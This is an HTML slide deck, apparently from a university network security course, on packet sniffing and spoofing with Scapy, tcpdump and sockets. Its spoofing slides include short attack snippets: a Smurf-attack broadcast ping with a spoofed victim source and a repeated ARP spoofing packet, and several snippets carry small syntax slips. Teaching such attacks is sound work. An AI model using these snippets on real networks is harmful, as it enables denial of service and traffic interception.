@@ -1,0 +1,351 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"><base target="_blank">
+    <title>Network Security slide set</title>
+    <meta name="description" content="A set of slides for a course on Introduction to Cybersecurity">
+    <meta name="author" content="Aaron Bloomfield">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+    <link rel="stylesheet" href="../slides/reveal.js/dist/reset.css">
+    <link rel="stylesheet" href="../slides/reveal.js/dist/reveal.css">
+    <link rel="stylesheet" href="../slides/reveal.js/dist/theme/black.css" id="theme">
+    <link rel="stylesheet" href="../slides/nws.css">
+    <!-- Code syntax highlighting -->
+    <link rel="stylesheet" href="../slides/reveal.js/plugin/highlight/zenburn.css">
+    <!-- Printing and PDF exports -->
+    <script>
+      var link = document.createElement( 'link' );
+      link.rel = 'stylesheet';
+      link.type = 'text/css';
+      link.href = window.location.search.match( /print-pdf/gi ) ? '../slides/reveal.js/css/print/pdf.scss' : '../slides/reveal.js/css/print/paper.scss';
+      document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+    <!--[if lt IE 9]>
+	<script src="../slides/reveal.js/lib/js/html5shiv.js"></script>
+	<![endif]-->
+  </head>
+
+  <body>
+    <div class="reveal">
+      <div class="slides">
+
+<section data-markdown id="cover"><script type="text/template">
+# CS 4760
+&nbsp;  
+### Network Security
+
+<p class='titlep'>&nbsp;</p>
+<div class="titlesmall"><p>
+<a href="http://www.cs.virginia.edu/~asb">Aaron Bloomfield</a> (aaron@virginia.edu)<br>
+<a href="http://github.com/aaronbloomfield/nws">@github</a> | <a href="index.html">&uarr;</a> | <a href="?print-pdf"><img class="print" width="20" src="../slides/images/print-icon.webp" style="top:0px;vertical-align:middle"></a>
+</p></div>
+<p class='titlep'>&nbsp;</p>
+
+## Packet Sniffing and Spoofing
+</script></section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section data-markdown><textarea data-template>
+# Contents
+&nbsp;  
+[Packet Sniffing](#/sniffing)  
+[Packet Spoofing](#/spoofing)  
+</textarea></section>
+  
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="sniffing" class="center"><textarea data-template>
+# Packet Sniffing
+</textarea></section>
+    
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+## Packet Sniffing Access
+- Hardware access, such as the [LAN Tap](https://hak5.org/products/bug), [Packet Squirrel](https://hak5.org/products/packet-squirrel-mark-ii), or [LAN turtle](https://hak5.org/products/lan-turtle)
+  - Or just plugging into a network jack
+- Wifi listening or via promiscuous mode
+- [WiFi Pineapple](https://hak5.org/products/wifi-pineapple)
+- ARP Spoofing
+- DNS route spoofing
+- Controlling a router along a network path
+- Python, using Scapy
+- Shell access using tcpdump, tshark, or wireshark
+
+
+
+<!-- .slide: class="right-float-img-1000 no-border" -->
+## Ports
+![](images/packets/etc-services.webp)
+- A *port* is a way to connect to a given service (program) on a host
+  - A way for the OS kernel to figure out which service a network connection wants
+  - Ports under 1,024 are *privileged* -- only the system can use them
+  - Anybody can open up unprivileged ports
+- Well known ports are listed in /etc/services
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## Ports and connections
+![Web browsers](images/networking/web-browsers.webp)
+- When your web browser connects...
+  - It opens up a high port (50k or so)
+  - It connects to port 80 (or 443) on the server
+    - And says it comes from port, say, 56,789
+  - The web server response goes back to port 56,789
+  - The kernel directs that to the web browser
+
+
+
+<!-- .slide: class="right-float-img-1000 no-border" -->
+## Sockets
+[![](https://upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Power_socket.jpg/575px-Power_socket.jpg)](https://commons.wikimedia.org/wiki/File:Power_socket.jpg)
+- A socket is how you open a port on a machine
+- A socket is either:
+  - An opened port on a server waiting for a connection
+  - A connection to an opened port on another machine
+- Sockets are usually bi-directional
+
+
+
+<!-- .slide: class="small-pre" -->
+<h2 class="r-fit-text">Sockets in Python: <a href='code/socket_ex.py.html'>socket_ex.py</a> (<a href='code/socket_ex.py'>src</a>)</h2>
+
+```python
+import socket, sys
+mode = sys.argv[1]
+remotehost = sys.argv[2]
+PORT = 5678
+other_ip = socket.gethostbyname(remotehost)
+
+if mode == "server":
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  sock.bind(("0.0.0.0", PORT))
+elif mode == "client":
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+if mode == "client":
+  sock.sendto(b"hello, world", (other_ip, PORT))
+  print(mode,"sent 'hello, world' to server at",other_ip)
+
+if mode == "server":
+  data, (ip, port) = sock.recvfrom(2**16)
+  print(mode,"received",data,"from",ip,port)
+  sock.sendto(b"goodbye!", (other_ip, port))
+  print(mode,"sent 'goodbye!' to client at",other_ip,port)
+  
+if mode == "client":
+  data, (ip, port) = sock.recvfrom(2**16)
+  print(mode,"received",data,"from server at",ip,port)
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+<h2><a href='code/socket_ex.py.html'>socket_ex.py</a> (<a href='code/socket_ex.py'>src</a>) Output</h2>
+
+outer1:
+```
+root@outer1:/mnt# python3 socket_ex.py server outer2
+server received b'hello, world' from 192.168.100.102 39259
+server sent 'goodbye!' to client at 192.168.100.102 39259
+root@outer1:/mnt# 
+```
+
+outer2:
+```
+root@outer2:/mnt# python3 socket_ex.py client outer1
+client sent 'hello, world' to server at 192.168.100.101
+client received b'goodbye!' from server at 192.168.100.101 5678
+root@outer2:/mnt# 
+```
+
+tcpdump:
+```
+root@outer2:/mnt# tcpdump -i eth0 -n
+15:18:26.187214 IP 192.168.100.102.39259 > 192.168.100.101.5678: UDP, length 12
+15:18:26.187392 IP 192.168.100.101.5678 > 192.168.100.102.39259: UDP, length 8
+^C
+root@outer2:/mnt# 
+```
+
+
+
+## Socket Types
+- Consider: 
+```python
+socket(socket.AF_INET, socket.SOCK_DGRAM)
+```
+- Address family:
+  - `AF_INET` is IPv4 addresses
+  - `AF_INET6` is IPv6 addresses
+  - `AF_NETLINK` is IPv4 addresses but in promiscuous mode
+- Socket type:
+  - `SOCK_STREAM`: TCP connection
+    - Pass in the payload, and the headers are put on for you
+  - `SOCK_DGRAM`: UDP connection
+    - Also pass in the payload, and the headers are put on for you
+  - `SOCK_RAW`: you include *all* the packet headers
+    - Well, likely only TCP and IP
+
+
+
+<!-- .slide: class="wide-pre" -->
+## Packet sniffing using Scapy
+```python
+def sniff_icmp_commands(pkt):
+    # fill me in...
+    pass
+
+sniff(filter='icmp',iface=iface,prn=sniff_icmp_commands)
+```
+Or in a separate thread:
+```python
+def sniff_icmp_commands(pkt):
+    # fill me in...
+    pass
+
+def start_sniffing(sig = None, frame = None):
+    sniff(filter='icmp',iface=iface,prn=sniff_icmp_commands)
+
+threading.Thread(target=start_sniffing, args=(), daemon=True).start()
+```
+
+
+
+<h2 class="r-fit-text">Berkeley Packet Filter (BPF) syntax</h2>
+
+- We've seen these before: the `filter` passed to Scapy's `sniff()`
+  - `icmp`
+  - `icmp or tcp`
+  - `tcp and (ether src 192.168.100.1 or ether src 192.168.100.102)`
+- Full description is at [https://biot.com/capstats/bpf.html](https://biot.com/capstats/bpf.html)
+
+
+
+## Packet capture with `tcpdump`
+- Basic usage:
+```
+tcpdump -i eth0 -n
+```
+- listen on eth0, leave ports as numbers (not names), only display summaries
+```
+tcpdump -s 0 "port ftp or ssh" -i eth0 -w mycap.pcap
+```
+- listen to ports 21 or 22 on eth0 and save to `mycap.pcap`
+  - .pcap is a packet capture file format (and an API)
+  - The packets to capture are displayed in the BPF syntax
+
+
+
+## Miscellaneous
+- Once a packet is captured, pass the raw binary data into the appropriate Scapy constructor, and Scapy will parse it for you
+```python
+bin_data = get_from_network()
+packet = IP(bin_data)
+```
+- Note that in containers in docker, when the NICs are set to promiscuous mode, they still may not see other network traffic
+
+
+
+<!-- .slide: class="right-float-img-1000 no-border" -->
+## Wireshark
+[![](https://upload.wikimedia.org/wikipedia/commons/3/34/Wireshark_Network_Analyzer_Screen.png)](https://commons.wikimedia.org/wiki/File:Wireshark_Network_Analyzer_Screen.png)
+- A graphical version of all of this
+- We'll run it from the Docker containers
+  - This is why we need the GUI...
+- The subject of upcoming assignments
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="spoofing" class="center"><textarea data-template>
+# Packet Spoofing
+</textarea></section>
+    
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+<!-- .slide: class="small-pre" -->
+## Scapy packet spoofing
+- Spoof a ping:
+```python
+send( IP(dst=..., src=...) / ICMP(type=8) )
+```
+- Spoof a UDP or TCP packet:
+```python
+send( IP=(dst=..., src=...) / UDP(sport=..., dport=...) / data )
+send( IP=(dst=..., src=...) / TCP(sport=..., dport=...) / data )
+```
+- Spoof a request to a web server from another machine:
+  - The `data` would be a web request in the http protocol
+```python
+send( IP=(dst=..., src=...) / TCP(sport=80, dport=...) / data )
+```
+
+
+
+## Scapy Layers
+- The lower level "thing" (packet or data) goes on the left of the `/` operator
+```python
+Ether(...) / IP(...) / TCP(...) / data
+```
+- To create a ping packet:
+```python
+IP(dst=...) / ICMP(type=8)
+```
+
+
+
+<!-- .slide: class="right-float-img-600 no-border" -->
+![](https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Grote_Smurf_%2801%29.jpg/818px-Grote_Smurf_%2801%29.jpg)
+## [Smurf attack](https://en.wikipedia.org/wiki/Smurf_attack)
+- Sends a ping to the broadcast, with the source as the victim
+- Lots of replies!
+
+<br clear='all'>
+
+```python
+hostname = socket.gethostname()
+hostip = socket.gethostbyname(hostname)
+broadcast = re.sub(r'\d+','552',hostip[::-1],1)[::-1]
+victim = re.sub(r'\d+','1',hostip[::-1],1)[::-1]
+packet = IP(src=victim, dst=broadcast) / ICMP(type=8)
+send(packet)
+```
+
+
+
+## ARP Spoofing
+- If we want to tell `target_ip` the new mac for `victim_ip`
+```python
+packet = ARP(op=2, pdst=target_ip, \
+             hwdst=getmacbyip(target_ip), \
+             psrc=victim_ip)
+send(packet, verbose)
+```
+- Repeat sending this every 4 or 5 seconds
+
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+	
+</div>
+</div>
+<script src="../slides/reveal.js/dist/reveal.js"></script>
+<script src="../slides/reveal.js/plugin/zoom/zoom.js"></script>
+<script src="../slides/reveal.js/plugin/notes/notes.js"></script>
+<script src="../slides/reveal.js/plugin/search/search.js"></script>
+<script src="../slides/reveal.js/plugin/markdown/markdown.js"></script>
+<script src="../slides/reveal.js/plugin/highlight/highlight.js"></script>
+<script src="../slides/reveal.js/plugin/math/math.js"></script>
+<script src="settings.js"></script>
+</body>
+</html>
